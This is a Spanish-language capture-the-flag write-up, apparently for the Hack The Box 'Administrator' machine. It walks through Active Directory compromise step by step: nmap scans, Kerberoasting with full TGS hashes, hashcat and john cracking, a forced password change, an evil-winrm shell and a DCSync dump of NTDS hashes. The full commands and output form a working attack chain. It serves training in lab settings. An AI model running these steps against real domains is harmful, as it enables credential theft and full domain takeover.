[{"content":"\nAs is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich\nReconocimiento Escaneo de puertos abiertos:\n‚ùØ sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.42 -oG ports Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-30 11:49 +0200 Initiating SYN Stealth Scan at 11:49 Scanning 10.10.11.42 [65535 ports] Discovered open port 139/tcp on 10.10.11.42 Increasing send delay for 10.10.11.42 from 0 to 5 due to 158 out of 526 dropped probes since last increase. Discovered open port 21/tcp on 10.10.11.42 Discovered open port 445/tcp on 10.10.11.42 Discovered open port 53/tcp on 10.10.11.42 Discovered open port 135/tcp on 10.10.11.42 Discovered open port 49667/tcp on 10.10.11.42 Discovered open port 50958/tcp on 10.10.11.42 Discovered open port 3269/tcp on 10.10.11.42 Discovered open port 49665/tcp on 10.10.11.42 Discovered open port 9389/tcp on 10.10.11.42 Discovered open port 5985/tcp on 10.10.11.42 Discovered open port 636/tcp on 10.10.11.42 Discovered open port 61600/tcp on 10.10.11.42 Discovered open port 50963/tcp on 10.10.11.42 Discovered open port 50985/tcp on 10.10.11.42 Discovered open port 49664/tcp on 10.10.11.42 Increasing send delay for 10.10.11.42 from 5 to 10 due to max_successful_tryno increase to 4 Increasing send delay for 10.10.11.42 from 10 to 20 due to max_successful_tryno increase to 5 Increasing send delay for 10.10.11.42 from 20 to 40 due to 87 out of 289 dropped probes since last increase. Increasing send delay for 10.10.11.42 from 40 to 80 due to max_successful_tryno increase to 6 Discovered open port 49668/tcp on 10.10.11.42 Discovered open port 389/tcp on 10.10.11.42 Discovered open port 88/tcp on 10.10.11.42 Discovered open port 3268/tcp on 10.10.11.42 Discovered open port 50947/tcp on 10.10.11.42 Discovered open port 49666/tcp on 10.10.11.42 Discovered open port 593/tcp on 10.10.11.42 Discovered open port 464/tcp on 10.10.11.42 Discovered open port 47001/tcp on 10.10.11.42 Discovered open port 50966/tcp on 10.10.11.42 Completed SYN Stealth Scan at 11:50, 15.13s elapsed (65535 total ports) Nmap scan report for 10.10.11.42 Host is up, received user-set (0.045s latency). Scanned at 2025-06-30 11:49:53 CEST for 15s Not shown: 65509 closed tcp ports (reset) PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 127 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49668/tcp open unknown syn-ack ttl 127 50947/tcp open unknown syn-ack ttl 127 50958/tcp open unknown syn-ack ttl 127 50963/tcp open unknown syn-ack ttl 127 50966/tcp open unknown syn-ack ttl 127 50985/tcp open unknown syn-ack ttl 127 61600/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.18 seconds Raw packets sent: 73737 (3.244MB) | Rcvd: 66196 (2.648MB) Escaneo todos los puertos:\n‚ùØ ports.py ports ‚Äã üîç Puertos encontrados: ‚ûú 21 ‚ûú 53 ‚ûú 88 ‚ûú 135 ‚ûú 139 ‚ûú 389 ‚ûú 445 ‚ûú 464 ‚ûú 593 ‚ûú 636 ‚ûú 3268 ‚ûú 3269 ‚ûú 5985 ‚ûú 9389 ‚ûú 47001 ‚ûú 49664 ‚ûú 49665 ‚ûú 49666 ‚ûú 49667 ‚ûú 49668 ‚ûú 50947 ‚ûú 50958 ‚ûú 50963 ‚ûú 50966 ‚ûú 50985 ‚ûú 61600 ‚Äã ¬°Puertos copiados en el portapapeles! Escaneo de servicios:\n‚ùØ sudo nmap -sCV -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,50947,50958,50963,50966,50985,61600 -Pn 10.10.11.42 -oN targeted Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-30 11:57 +0200 Nmap scan report for 10.10.11.42 Host is up (0.11s latency). ‚Äã PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-30 16:57:08Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 50947/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 50958/tcp open msrpc Microsoft Windows RPC 50963/tcp open msrpc Microsoft Windows RPC 50966/tcp open msrpc Microsoft Windows RPC 50985/tcp open msrpc Microsoft Windows RPC 61600/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows ‚Äã Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required | smb2-time: | date: 2025-06-30T16:58:05 |_ start_date: N/A |_clock-skew: 6h59m50s ‚Äã Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 75.66 seconds Empezamos enumerando las carpetas compartidas pero no encontramos nada interesante.\n‚ùØ nxc smb 10.10.11.42 -u \u0026#39;Olivia\u0026#39; -p \u0026#39;ichliebedich\u0026#39; --shares SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\Olivia:ichliebedich SMB 10.10.11.42 445 DC [*] Enumerated shares SMB 10.10.11.42 445 DC Share Permissions Remark SMB 10.10.11.42 445 DC ----- ----------- ------ SMB 10.10.11.42 445 DC ADMIN$ Remote Admin SMB 10.10.11.42 445 DC C$ Default share SMB 10.10.11.42 445 DC IPC$ READ Remote IPC SMB 10.10.11.42 445 DC NETLOGON READ Logon server share SMB 10.10.11.42 445 DC SYSVOL READ Logon serv BloodHound Enumeration Lanzamos el script bloodhound-pyhton y nos ponemos a mirar los permisos que tiene disponible el usuario Olivia.\nEs entonces cuando vemos que tenemos permisos genericAll sobre el usuario Michael.\nKerberoast attack Entonces nos sincronizamos con la hora del dominio y lanzamos el ataque kerberoast para ver si el Key Distribution Center (KDC) nos devuelve el Ticket Garanting Service (TGS).\n‚ùØ sudo ntpdate -u 10.10.11.42 [sudo] contrase√±a para borhub: 30 Jun 22:24:57 ntpdate[18024]: step time server 10.10.11.42 offset +25191.690143 sec ‚ùØ ./targetedKerberoast.py --dc-ip 10.10.11.42 -d \u0026#39;ADMINISTRATOR.htb\u0026#39; -u \u0026#39;Olivia\u0026#39; -p \u0026#39;ichliebedich\u0026#39; [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [+] Printing hash for (michael) $krb5tgs$23$*michael$ADMINISTRATOR.HTB$ADMINISTRATOR.htb/michael*$b83c2c411adef0b972d360a349a93078$567cd69e9bdedfc998d2261dcfb017076372141f3b53fcfca0b7dfa23f0b7b5039f232a74737ce172fdb1e4d1952e74726694f31760562f5e3d1d0e0808f6da11ae57e876e09dc6518e0dcd35af501b146d43d80adc8c493a1894c0ceb9c84a7ff2fc8b3bbef1070c540175b28e3836d950d39713679dfd7d0f95f3e1a750be697462baaf08aa66470c71a6ea21947a2445d67a838b4feb5da475d21cac896a58c84d04ed8949544a40aa5f13b9dbda6739233a74cb638983b15b2367ef0f71cec6ade9579fa056f9f8aeab82064d86267e6ad14ed9be09ce2bfa4181811b28e8e1277cd08d420a339c19be0476bdf13af159adb136a574dfe781b7b7236f8813f1f58434f507e709bba835b1780b06e4ad9c815c1447f55e0ea280a73a87ab2d280e31af7474eff1bf797147d07487d833526368a3381b3e3af66c43909c2046a1beea875b5e89328dded1bc580885cbdce1714724a4f76b5fcfd8fa0e7eb1a16034177d84943bed7d4297bfbfd9d2ad7814b12dd03241f9bb7514649e0de0ed00cf218d30f958da469eb0770b0e99feaf78b5990eef985eb4e929caad12b682cb0380627434702f165700c994a8cdf77ea614499a3c447898d5964000192a5ac5ad60864f649646b07a2186bef66c525d3ba3ae308172bd01c69f7f7228bb674912a16514fdf9242b7d573de2d9151407259d49cca6fcdcc369a6102cfffec921daa988b7789a3b14f091c3543ce054f13274c7abc85febd52124e9403b8538cdd3b3d10bd5e9f9d008a06260af49af1ddd7425aec410a99c3ff218cfabe9134535440db9d29439766b51ef6eb7dd7cd74e6e7c9f609fc42fab6212c2f41fe4a4e26fb71cf1ecc25b3aacf842acdd40a5b41f3001248dfe721b13d59fd17b14709d1e443d358390d4679e620f0304f757db0e7f2cd80bb570d859ee43921221443c1ce495ef173c663c6a2b620a397072e2882e36558e0e19fdbb19e69e02e588066a185eee7082246122e1d8aea5636049cc23d83cb2ae7167f7e5810fbda1585c1c77db1eafcf46088b03b7b70bcef1f0bf8146fbe3b8a4922f293141c83a990add33b883775e1c4dee2b103cd704b6920eacba3bb3a1d6042385e07632f56167690543ee59b42bc497b6a90574c28b2a323ef99b19516c22ac5d1d31b8a1fa1e15e75558ea3ede543ddc2332acb54dab40c6c09c79480745a04441761780a023bbf29fb3a34ce245eea6405651d64a70e0cbb0ed67c41d8fb9ce796771cee011578d282d254f17175f6965bb0296195ba1598b74ad9317fd8f2bb32a33bce2f718c1e0ef8d802b30ae9167e19209348dca0ed9c783af3e43bdff6498ed24cc621ef7ce6763e29155ee918255896c0f68865320ab62895af2a242338f7bf8ea116f8b29d0d76c482eef440f6500520f57a0d718b82248403e5a727061fa0fd217b7fba426ec01a769dd6fd45abb04016666903ead5d34894a9cff84a27fbac1f92e0a6f02d268a445f03b5ca526402f32104819250c6 Una vez lanzado el ataque vemos que nos devuelve el TGS del usuario michael con lo cual ahora intentamos crackearlo para obtener la contrase√±a.\n‚ùØ hashcat -m 13100 --force -a 0 kerberohash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --force hashcat (v6.2.6) starting ...SNIP... Dictionary cache hit: * Filename..: /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt * Passwords.: 14344384 * Bytes.....: 139921497 * Keyspace..: 14344384 $krb5tgs$23$*michael$ADMINISTRATOR.HTB$ADMINISTRATOR.htb/michael*$b83c2c411adef0b972d360a349a93078$567cd69e9bdedfc998d2261dcfb017076372141f3b53fcfca0b7dfa23f0b7b5039f232a74737ce172fdb1e4d1952e74726694f31760562f5e3d1d0e0808f6da11ae57e876e09dc6518e0dcd35af501b146d43d80adc8c493a1894c0ceb9c84a7ff2fc8b3bbef1070c540175b28e3836d950d39713679dfd7d0f95f3e1a750be697462baaf08aa66470c71a6ea21947a2445d67a838b4feb5da475d21cac896a58c84d04ed8949544a40aa5f13b9dbda6739233a74cb638983b15b2367ef0f71cec6ade9579fa056f9f8aeab82064d86267e6ad14ed9be09ce2bfa4181811b28e8e1277cd08d420a339c19be0476bdf13af159adb136a574dfe781b7b7236f8813f1f58434f507e709bba835b1780b06e4ad9c815c1447f55e0ea280a73a87ab2d280e31af7474eff1bf797147d07487d833526368a3381b3e3af66c43909c2046a1beea875b5e89328dded1bc580885cbdce1714724a4f76b5fcfd8fa0e7eb1a16034177d84943bed7d4297bfbfd9d2ad7814b12dd03241f9bb7514649e0de0ed00cf218d30f958da469eb0770b0e99feaf78b5990eef985eb4e929caad12b682cb0380627434702f165700c994a8cdf77ea614499a3c447898d5964000192a5ac5ad60864f649646b07a2186bef66c525d3ba3ae308172bd01c69f7f7228bb674912a16514fdf9242b7d573de2d9151407259d49cca6fcdcc369a6102cfffec921daa988b7789a3b14f091c3543ce054f13274c7abc85febd52124e9403b8538cdd3b3d10bd5e9f9d008a06260af49af1ddd7425aec410a99c3ff218cfabe9134535440db9d29439766b51ef6eb7dd7cd74e6e7c9f609fc42fab6212c2f41fe4a4e26fb71cf1ecc25b3aacf842acdd40a5b41f3001248dfe721b13d59fd17b14709d1e443d358390d4679e620f0304f757db0e7f2cd80bb570d859ee43921221443c1ce495ef173c663c6a2b620a397072e2882e36558e0e19fdbb19e69e02e588066a185eee7082246122e1d8aea5636049cc23d83cb2ae7167f7e5810fbda1585c1c77db1eafcf46088b03b7b70bcef1f0bf8146fbe3b8a4922f293141c83a990add33b883775e1c4dee2b103cd704b6920eacba3bb3a1d6042385e07632f56167690543ee59b42bc497b6a90574c28b2a323ef99b19516c22ac5d1d31b8a1fa1e15e75558ea3ede543ddc2332acb54dab40c6c09c79480745a04441761780a023bbf29fb3a34ce245eea6405651d64a70e0cbb0ed67c41d8fb9ce796771cee011578d282d254f17175f6965bb0296195ba1598b74ad9317fd8f2bb32a33bce2f718c1e0ef8d802b30ae9167e19209348dca0ed9c783af3e43bdff6498ed24cc621ef7ce6763e29155ee918255896c0f68865320ab62895af2a242338f7bf8ea116f8b29d0d76c482eef440f6500520f57a0d718b82248403e5a727061fa0fd217b7fba426ec01a769dd6fd45abb04016666903ead5d34894a9cff84a27fbac1f92e0a6f02d268a445f03b5ca526402f32104819250c6:password Y comprobamos que las credenciales sean validas con nxc.\n‚ùØ nxc smb 10.10.11.42 -u \u0026#39;michael\u0026#39; -p \u0026#39;password\u0026#39; SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\michael:password ForceChangePassword - Net rpc Si volvemos a comprobar el bloodhound vemos que michael tiene el permiso ForceChangePassword sobre el usuario Benjamin, es decir, tenemos la capacidad de cambiarle la contrase√±a.\nLanzamos el comando con net rpc y cambiamos la contrase√±a a Benjamin a \u0026ldquo;password\u0026rdquo;.\n‚ùØ net rpc password \u0026#34;benjamin\u0026#34; \u0026#39;password\u0026#39; -U ADMINISTRATOR.HTB/michael%password -S \u0026#34;10.10.11.42\u0026#34; Comprobaci√≥n de credenciales:\n‚ùØ nxc smb 10.10.11.42 -u \u0026#39;benjamin\u0026#39; -p \u0026#39;password\u0026#39; SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\benjamin:password Acceso inicial Mirando el bloodhound de benjamin, solo vemos que es miembro del grupo Share Moderators. Esto me puede dar una pista que puede tener permiso en alg√∫n tipo de carpeta compartida. Al principio del escaneo hab√≠amos visto que el puerto 21 (ftp) se encontraba abierto, con lo cual, intentamos conectarnos con estas credenciales.\nFTP Enumeration Nos conectamos a el servidor ftp y descubrimos el archivo \u0026ldquo;Backup.psafe3\u0026rdquo;.\n‚ùØ ftp 10.10.11.42 Connected to 10.10.11.42. 220 Microsoft FTP Service Name (10.10.11.42:borhub): benjamin 331 Password required Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 10-05-24 09:13AM 952 Backup.psafe3 226 Transfer complete. ftp\u0026gt; get Backup.psafe3 200 PORT command successful. 150 Opening ASCII mode data connection. WARNING! 3 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 952 bytes received in 0,1237 seconds (7,5134 kbytes/s) Vemos que hemos obtenido un archivo .psafe3 que se suele asociar a los archivos que tienen una base de datos de credenciales almacenadas de la aplicaci√≥n Password Safe. As√≠ que nos instalamos la aplicaci√≥n Password Safe y intentamos abrir el archivo con ella, pero nos pide una contrase√±a la cual no tenemos:\nComo no tenemos la contrase√±a, vamos a intentar sacar el hash con la herramienta psafe2john sacada del John the ripper jumbo.\n‚ùØ ./pwsafe2john.py /home/borhub/Workspace/HTB/Administrator/CONTENT/Backup.psafe3 Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050 Y ahora vamos a crackearlo con jhon.\n‚ùØ john backuphash --wordlist=/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt Warning: detected hash type \u0026#34;pwsafe\u0026#34;, but the string is also recognized as \u0026#34;pwsafe-opencl\u0026#34; Use the \u0026#34;--format=pwsafe-opencl\u0026#34; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 AVX 4x]) Cost 1 (iteration count) is 2048 for all loaded hashes Will run 16 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status tekieromucho (Backu) 1g 0:00:00:00 DONE (2025-07-01 00:13) 3.703g/s 30340p/s 30340c/s 30340C/s 123456..total90 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed Si vemos la salida que tenemos al listar usuarios vemos que existen los siguientes:\n‚ùØ nxc smb 10.10.11.42 -u \u0026#39;benjamin\u0026#39; -p \u0026#39;password\u0026#39; --users SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\benjamin:password SMB 10.10.11.42 445 DC -Username- -Last PW Set- -BadPW- -Description- SMB 10.10.11.42 445 DC Administrator 2024-10-22 18:59:36 0 Built-in account for administering the computer/domain SMB 10.10.11.42 445 DC Guest \u0026lt;never\u0026gt; 0 Built-in account for guest access to the computer/domain SMB 10.10.11.42 445 DC krbtgt 2024-10-04 19:53:28 0 Key Distribution Center Service Account SMB 10.10.11.42 445 DC olivia 2024-10-06 01:22:48 0 SMB 10.10.11.42 445 DC michael 2025-06-30 00:11:02 0 SMB 10.10.11.42 445 DC benjamin 2025-06-30 20:45:09 0 SMB 10.10.11.42 445 DC emily 2024-10-30 23:40:02 0 SMB 10.10.11.42 445 DC ethan 2024-10-12 20:52:14 0 SMB 10.10.11.42 445 DC alexander 2024-10-31 00:18:04 0 SMB 10.10.11.42 445 DC emma 2024-10-31 00:18:35 0 SMB 10.10.11.42 445 DC [*] Enumerated 10 local users: ADMINISTRATOR Ahora vamos a copiar los usuarios y las contrase√±as obtenidas en Password Safe a los archivos user y password para luego comprobar las credenciales.\n‚ùØ nxc smb 10.10.11.42 -u users -p passwords SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb Una vez comprobadas las credenciales iniciamos sesi√≥n a trav√©s de winrm y conseguimos la user flag.\n‚ùØ evil-winrm -i 10.10.11.42 -u emily -p \u0026#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb\u0026#39; Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method \u0026#39;quoting_detection_proc\u0026#39; for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\emily\\Documents\u0026gt; type ../Desktop/user.txt 62b2bb880ec2520e82847e082e86e18b Escalada de privilegios Si miramos los permisos ACL que tiene el usuario emily, vemos que tiene permisos GenericWrite sobre el usuario ethan.\nKerberoast attack Volvemos a lanzar el ataque kerberoasting para obtener el Ticket Garanting Service (TGS) cifrado con el hash NTLM/NTHash de la cuenta solicitada.\n‚ùØ ./targetedKerberoast.py --dc-ip 10.10.11.42 -d \u0026#39;ADMINISTRATOR.htb\u0026#39; -u \u0026#39;emily\u0026#39; -p \u0026#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb\u0026#39; [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [+] Printing hash for (ethan) $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$ADMINISTRATOR.htb/ethan*$66eaa14ca29fe4fbfadfc7dc81b18730$6b3b78c7fd664d7d39d3bff5567328b10759306a4cf7124e1322e63c4abdfe419bff877d4c7e74eccc542951d18016ca5b0f3ccefddd2bdba597c50b8ff4faf2db3a3d82b7c507564f76c2d26695430ebc6faa36cff5993e9d275068a201c8668436887b8719725535a091fce09ac2ddf028fb093abb3898a6086f229967de5c4a7f5fd20d6035273723d038849da8e3b2bac0372e37472e17604772e498e619e95c4a3d736479d6837762131a2b995f9368fd9ffccc76620b25ad893e9a36e922cff25fe07f56b975a7ca1c38660888e9be0662ced2d9340491383b4cbe0d05c2578b66f3470bd07d4e0de11ff819a2622a6348e7c21b6127c513bdec7fc890b51729aca24195349f06fcf205b71a9d3f074cfa3157f87cf31c070fe44a1abbc1a4ea5a23825437acc30999d5abdfbee0be38ad583526abf44dac8b60a0f48b0ade25abaa906c469ab1f00307b76178dbef0cf767320ba1868c052bb9e318d3cddbea6e4059fd6aaa99600ba6e969ec7144b688963f402793b03118a961627a55fefd040b4e8255347da60787d9b301039fb777746a639808f7627fd23f2ef297c370b7058408abf4e901bef2a1cb4d26ce231a6825400e13e9f34c42dd9b7ee7de233e1f4f97327109ba7f8a5633f40bcaa90e624f5bba2da30f449ee39b29d9de793fbbd7e90ccd10105d3c375b42bab66ff911dbc1c7ecf7c790e865f41b89e2fe87434aefda2a5e5eb93f004ce780384a9706d522be678dcfe5b98e8f4eb33ac12311b017023747f5318dda3a67a04358cccd4d38a554a3d8d09fe380f8535b6bc4e1504bcc3d169837a6fad24ca7b3df9ab8a7d1cbc00877e35da141f24f35a19a1dd1c134b4410964a0ae0c18ad25af5a54a628e18fb3d1ec5da93d6e518a7b09d21e9dc3a3d627b80a39623ad685b2ee90e10fe4c710d4c9d0b0f145ca737ab8527074b8b5ea9cc1fa0b67be253660fab9cd18ccf34c8c14dee30d0b830ea16f2bf314ed44f060a7cf5bd1bf2cf93337f2b8f5d52b6e6fd331d52a7a85626db1d11249e5dadb758c0c8cca517fa5c629678a957f5b29c3ca5f9ee1d93fcf40af608ae7c34a4e3ef3838756b2108c08a7e9689394c781ae3d7f2313261b3f23f1e2d6fd0bec5a40a500952f3b300723c6679648a9b861413c6a4c5f361eb3f9a7d472567f517efe25977ddbc0c9f53d8c2aad0ab7022aa9f31e256ca8bb37a04c00d08e6cd7629a1187e90e9ecbe4e5eb2035f0a8dc87d16d21655e9590784ebc3b8c55dcbcd77b5cd089bc52af5538b067ae3aa3f862128fd17e2e24b497e2da67cad4a6c851f0261a9018858e3ac74f3974008f73301e491b5227e514222fdd43f7ea2938548e593fdd3a17effc62ae7b49066e39f218feb4462e2c0cfbe773f7a477ad9f43b8e80491c861d5c774213dd2d6d5e9766fe2afa21cf7cdafde6727e2ccd43acffa47b822b087dfdcbe11d0bcba892c73fdc2325cf2201101f2e3a85fe5b87b76935eb792631d0b4f5836e9f33c09c36608179ab6c0 Ahora tratamos de crackearlo con hashcat:\n‚ùØ hashcat -m 13100 --force -a 0 kerberohash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --force hashcat (v6.2.6) starting ...SNIP... Dictionary cache hit: * Filename..: /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt * Passwords.: 14344384 * Bytes.....: 139921497 * Keyspace..: 14344384 $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$ADMINISTRATOR.htb/ethan*$66eaa14ca29fe4fbfadfc7dc81b18730$6b3b78c7fd664d7d39d3bff5567328b10759306a4cf7124e1322e63c4abdfe419bff877d4c7e74eccc542951d18016ca5b0f3ccefddd2bdba597c50b8ff4faf2db3a3d82b7c507564f76c2d26695430ebc6faa36cff5993e9d275068a201c8668436887b8719725535a091fce09ac2ddf028fb093abb3898a6086f229967de5c4a7f5fd20d6035273723d038849da8e3b2bac0372e37472e17604772e498e619e95c4a3d736479d6837762131a2b995f9368fd9ffccc76620b25ad893e9a36e922cff25fe07f56b975a7ca1c38660888e9be0662ced2d9340491383b4cbe0d05c2578b66f3470bd07d4e0de11ff819a2622a6348e7c21b6127c513bdec7fc890b51729aca24195349f06fcf205b71a9d3f074cfa3157f87cf31c070fe44a1abbc1a4ea5a23825437acc30999d5abdfbee0be38ad583526abf44dac8b60a0f48b0ade25abaa906c469ab1f00307b76178dbef0cf767320ba1868c052bb9e318d3cddbea6e4059fd6aaa99600ba6e969ec7144b688963f402793b03118a961627a55fefd040b4e8255347da60787d9b301039fb777746a639808f7627fd23f2ef297c370b7058408abf4e901bef2a1cb4d26ce231a6825400e13e9f34c42dd9b7ee7de233e1f4f97327109ba7f8a5633f40bcaa90e624f5bba2da30f449ee39b29d9de793fbbd7e90ccd10105d3c375b42bab66ff911dbc1c7ecf7c790e865f41b89e2fe87434aefda2a5e5eb93f004ce780384a9706d522be678dcfe5b98e8f4eb33ac12311b017023747f5318dda3a67a04358cccd4d38a554a3d8d09fe380f8535b6bc4e1504bcc3d169837a6fad24ca7b3df9ab8a7d1cbc00877e35da141f24f35a19a1dd1c134b4410964a0ae0c18ad25af5a54a628e18fb3d1ec5da93d6e518a7b09d21e9dc3a3d627b80a39623ad685b2ee90e10fe4c710d4c9d0b0f145ca737ab8527074b8b5ea9cc1fa0b67be253660fab9cd18ccf34c8c14dee30d0b830ea16f2bf314ed44f060a7cf5bd1bf2cf93337f2b8f5d52b6e6fd331d52a7a85626db1d11249e5dadb758c0c8cca517fa5c629678a957f5b29c3ca5f9ee1d93fcf40af608ae7c34a4e3ef3838756b2108c08a7e9689394c781ae3d7f2313261b3f23f1e2d6fd0bec5a40a500952f3b300723c6679648a9b861413c6a4c5f361eb3f9a7d472567f517efe25977ddbc0c9f53d8c2aad0ab7022aa9f31e256ca8bb37a04c00d08e6cd7629a1187e90e9ecbe4e5eb2035f0a8dc87d16d21655e9590784ebc3b8c55dcbcd77b5cd089bc52af5538b067ae3aa3f862128fd17e2e24b497e2da67cad4a6c851f0261a9018858e3ac74f3974008f73301e491b5227e514222fdd43f7ea2938548e593fdd3a17effc62ae7b49066e39f218feb4462e2c0cfbe773f7a477ad9f43b8e80491c861d5c774213dd2d6d5e9766fe2afa21cf7cdafde6727e2ccd43acffa47b822b087dfdcbe11d0bcba892c73fdc2325cf2201101f2e3a85fe5b87b76935eb792631d0b4f5836e9f33c09c36608179ab6c0:limpbizkit Comprobaci√≥n de credenciales:\n‚ùØ nxc smb 10.10.11.42 -u \u0026#39;ethan\u0026#39; -p \u0026#39;limpbizkit\u0026#39; SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\ethan:limpbizkit DCSync Attack - nxc https://books.spartan-cybersec.com/cpad/persistencia-y-post-explotacion-en-ad/dcsync\nVemos que el usuario ethan del cual tenemos control actualmente tiene los permisos GetChangesAll y GetChanges sobre el dominio ADMINISTRATOR.HTB.\nEstos permisos nos permiten con nxc ejecutar el ataque DCSync, que consiste en solicitar informaci√≥n sensible del domain controler haci√©ndonos pasar por otro \u0026ldquo;domain controler\u0026rdquo;. En este caso solicitamos todos los hash NTLM/NTHash de los usuarios del sistema pero el que nos interesa es el del usuario administrator.\n‚ùØ nxc smb 10.10.11.42 -u \u0026#39;ethan\u0026#39; -p \u0026#39;limpbizkit\u0026#39; -d \u0026#39;administrator.htb\u0026#39; --ntds [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user \u0026lt;user\u0026gt; to dump a specific user safely or the module -M ntdsutil [Y/n] y SMB 10.10.11.42 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) SMB 10.10.11.42 445 DC [+] administrator.htb\\ethan:limpbizkit SMB 10.10.11.42 445 DC [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied SMB 10.10.11.42 445 DC [+] Dumping the NTDS, this could take a while so go grab a redbull... SMB 10.10.11.42 445 DC Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e::: SMB 10.10.11.42 445 DC Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 10.10.11.42 445 DC krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6::: SMB 10.10.11.42 445 DC administrator.htb\\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7::: 